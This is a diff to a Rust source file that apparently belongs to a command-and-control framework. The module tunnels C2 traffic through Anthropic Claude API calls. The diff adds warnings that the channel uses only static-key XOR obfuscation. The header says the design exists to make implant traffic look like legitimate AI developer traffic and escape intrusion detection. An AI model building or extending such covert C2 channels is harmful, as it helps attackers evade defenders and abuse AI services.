@@ -1,5 +1,11 @@
 //! LLM API C2 transport — Anthropic Claude API channel.
 //!
+//! ⚠ WARNING: This transport uses XOR obfuscation with a static key, NOT
+//! authenticated encryption. Anyone who recovers one known-plaintext frame
+//! can decrypt all subsequent traffic. The protocol-layer ChaCha20-Poly1305
+//! AEAD provides the real cryptographic protection — this XOR is only for
+//! making the traffic look like normal API text to a casual observer.
+//!
 //! Check Point Research (April 2026): LLM API traffic is the next-gen covert C2.
 //! Claude/Grok/Copilot API calls are TLS-encrypted, high-frequency, content-variable,
 //! and blend perfectly with legitimate AI dev traffic. No IDS signature can match.
@@ -243,6 +249,7 @@ impl Transport for LlmApiTransport {
     }
 
     fn init(&mut self) -> Result<(), TransportError> {
+        tracing::warn!("LLM API transport uses XOR obfuscation only — not authenticated encryption. Do not rely on this for confidentiality.");
         self.health_check().map(|_| ()).ok_or(TransportError::Dead(
             "LLM API key invalid or endpoint unreachable",
         ))
